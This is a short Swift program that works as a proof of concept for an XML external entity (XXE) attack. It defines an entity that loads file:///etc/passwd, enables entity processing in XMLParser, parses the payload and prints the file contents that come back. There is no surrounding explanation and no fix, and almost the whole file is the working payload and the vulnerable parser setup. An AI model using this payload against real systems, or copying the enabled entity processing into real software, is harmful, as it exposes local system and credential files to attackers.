import Foundation

let xml = """
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
"""

let parser = XMLParser(data: xml.data(using: .utf8)!)
parser.shouldProcessEntities = true // Default vulnerable

var output = ""

let delegate = SimpleDelegate(&output)
parser.delegate = delegate
parser.parse()

print("Content: \(output)")

class SimpleDelegate: NSObject, XMLParserDelegate {
    private var output: UnsafeMutablePointer<String>

    init(_ output: UnsafeMutablePointer<String>) {
        self.output = output
    }

    func parser(_ parser: XMLParser, foundCharacters string: String) {
        output.pointee += string
    }
}